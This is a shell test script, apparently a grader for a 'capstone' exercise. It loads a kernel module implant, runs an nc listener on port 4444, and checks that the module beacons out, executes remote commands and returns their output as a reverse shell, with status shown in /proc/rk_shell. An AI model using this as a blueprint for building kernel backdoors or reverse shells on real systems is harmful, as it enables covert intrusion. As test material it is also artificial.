#!/bin/sh
. /lib/check.sh

begin "capstone-4: implant"

ifconfig lo 127.0.0.1 up 2>/dev/null

token="implant_$$_$(date +%s)"
# The listener sends a command whose output cannot be hardcoded by the module.
(printf 'printf %s\nexit\n' "$token"; sleep 2) | nc -l -p 4444 > /tmp/rk_shell_out 2>/dev/null &
listener_pid=$!
sleep 1

load hello.ko target=127.0.0.1 port=4444 interval=1
assert_loaded hello
assert_exists /proc/rk_shell

# Wait for beacon to connect and execute
sleep 3

# Check proc output
assert_contains /proc/rk_shell "target=127.0.0.1"
assert_contains /proc/rk_shell "port=4444"

# Verify connection happened
conn=$(cat /proc/rk_shell | sed -n 's/^connections=\([0-9]*\)$/\1/p')
if [ "$conn" -gt 0 ] 2>/dev/null; then
    _ok "beacon connected ($conn connections)"
else
    _fail "beacon did not connect (connections=$conn)"
fi

# Verify command was executed
cmds=$(cat /proc/rk_shell | sed -n 's/^commands=\([0-9]*\)$/\1/p')
if [ "$cmds" -gt 0 ] 2>/dev/null; then
    _ok "commands executed ($cmds)"
else
    _fail "no commands executed (commands=$cmds)"
fi

# Check the exact command result returned over the socket.
wait $listener_pid 2>/dev/null
if [ -f /tmp/rk_shell_out ]; then
    out=$(cat /tmp/rk_shell_out)
    if [ "$out" = "$token" ]; then
        _ok "remote shell returned the exact dynamic result"
    else
        _fail "expected '$token', got '$out'"
    fi
else
    _fail "no output captured from listener"
fi

unload hello
assert_absent /proc/rk_shell

summary
